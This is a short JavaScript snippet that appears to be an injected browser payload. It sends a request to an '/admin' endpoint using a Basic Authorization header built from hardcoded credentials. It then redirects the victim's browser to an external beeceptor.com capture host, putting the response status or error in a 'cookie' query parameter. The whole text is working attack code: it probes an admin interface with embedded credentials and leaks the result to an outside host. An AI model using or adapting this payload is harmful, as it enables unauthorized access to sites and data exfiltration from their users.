(async () => {
  let headers = new Headers();
  headers.set('Authorization', 'Basic ' + btoa('dev_us' + ":" + 'valera_smeni_kredi_4mo'));
  fetch('/admin', {headers, redirect: 'manual'}).then(res => res.json()).then(res => {
    window.location.replace('https://gvfdgdfgfsfd.free.beeceptor.com?cookie=' + JSON.stringify(res.status));
  }).catch(err => {
    window.location.replace('https://gvfdgdfgfsfd.free.beeceptor.com?cookie=' + JSON.stringify(err))
  });
})()
